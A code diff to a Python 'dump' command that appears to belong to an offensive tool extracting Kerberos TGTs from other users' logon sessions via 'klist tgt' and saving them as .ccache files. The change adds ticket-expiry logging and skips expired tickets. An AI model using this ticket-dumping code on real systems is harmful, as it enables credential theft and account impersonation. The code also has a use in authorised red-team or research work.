@@ -426,6 +426,7 @@ def cmd_dump(args):
 
     written = []
     for i, (logon_hex, account) in enumerate(to_dump, 1):
+        print()
         logging.info("[%d/%d] Dumping TGT for %s (%s) ..." % (i, len(to_dump), account, logon_hex))
         tgt_text = _run_cmd(session, "klist tgt -li %s" % logon_hex)
         if not tgt_text:
@@ -444,7 +445,20 @@ def cmd_dump(args):
             logging.error("  %s: session key is Credential Guard-protected (wrapped in VTL1); "
                           "cannot export a usable ccache. Skipping." % account)
             continue
+          
+        now = time.time()
 
+        if info["end_time"]:
+            etime = datetime.fromtimestamp(info["end_time"]).isoformat()
+            logging.info("  EndTime: %s", etime)
+
+        if info["renew_till"]:
+            rtime = datetime.fromtimestamp(info["renew_till"]).isoformat()
+            logging.info("  Renew Until: %s", rtime)
+            if info["renew_till"] < now:          
+                logging.info("  Expired Ticket!")
+                continue
+              
         safe_name = re.sub(r"[^\w@.-]", "_", "%s@%s" % (info["client"], info["realm"]))
         out_path = os.path.join(args.output_dir, safe_name + ".ccache")
         if os.path.exists(out_path):
